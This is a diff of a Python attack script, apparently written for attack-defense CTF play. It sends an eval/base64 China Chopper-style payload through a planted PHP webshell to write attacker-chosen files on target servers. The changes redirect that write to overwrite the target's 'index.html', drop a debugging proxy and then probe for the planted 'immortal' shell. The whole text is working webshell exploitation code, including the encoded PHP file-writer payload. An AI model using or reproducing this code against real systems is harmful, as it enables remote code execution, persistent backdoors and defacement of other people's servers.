@@ -66,7 +66,7 @@ def cmd(url,method,passwd,web_path):
         return 0
 
     #加载要写入的内容
-    shellPath = "auxi/shell.php"
+    shellPath = "auxi/index.html"
     shell_content = loadfile(shellPath)
 
     #获取靶机的绝对路径
@@ -81,18 +81,18 @@ def cmd(url,method,passwd,web_path):
         data['pass']=hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()
         data[passwd] = "@eval(base64_decode($_POST['z0']));"
         data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRjPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTskYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTskYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTskYnVmPSIiO2ZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTIpJGJ1Zi49c3Vic3RyKCRjLCRpLDIpO2VjaG8oQGZ3cml0ZShmb3BlbigkZiwndycpLCRidWYpPycxJzonMCcpOztlY2hvKCJYQFkiKTtkaWUoKTs='
-        data['z1'] = base64.b64encode(web_path+"/fuck.php")
+        data['z1'] = base64.b64encode(web_path+"/index.html")
         data["z2"] = base64.b64encode(shell_content)
         #print data
         try:
-            res = requests.post(url,data=data,proxies={"http":"127.0.0.1:8080"})
+            res = requests.post(url,data=data)#,proxies={"http":"127.0.0.1:8080"})
         except:
             print "[-] %s Shell has already been Deleted"%url
     elif method=="get" :
         data['pass']=hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()
         data[passwd] = "@eval(base64_decode($_GET['z0']));"
         data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7JGM9YmFzZTY0X2RlY29kZSgkX0dFVFsiejIiXSk7JGM9c3RyX3JlcGxhY2UoIlxyIiwiIiwkYyk7JGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7JGJ1Zj0iIjtmb3IoJGk9MDskaTxzdHJsZW4oJGMpOyRpKz0yKSRidWYuPXN1YnN0cigkYywkaSwyKTtlY2hvKEBmd3JpdGUoZm9wZW4oJGYsJ3cnKSwkYnVmKT8nMSc6JzAnKTs7ZWNobygiWEBZIik7ZGllKCk7'
-        data['z1'] = base64.b64encode(web_path+"/fuck.php")
+        data['z1'] = base64.b64encode(web_path+"/index.html")
         data["z2"] = base64.b64encode(shell_content)
         #在检测url是否存在的时候还存在，而上传文件的时候shell被删掉了。
         try:
@@ -117,12 +117,11 @@ def cmd(url,method,passwd,web_path):
         b_url=b_url+"/"+list[i]
     bsm_url = b_url+"/fuck.php"
     try :
-        res = requests.post(bsm_url,data={"init":hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()},timeout=3)
-    except Exception,e:
-        # print e
+        res = requests.get(bsm_url,timeout=3)
+    except :
         pass
     #尝试访问不死马生成的shell
-    shell_url = b_url+"/.ghost.php"
+    shell_url = b_url+"/index.html"
     res = requests.get(shell_url)
     if res.status_code!=200 :
         print "[-] %s create shell failed!" %bsm_url
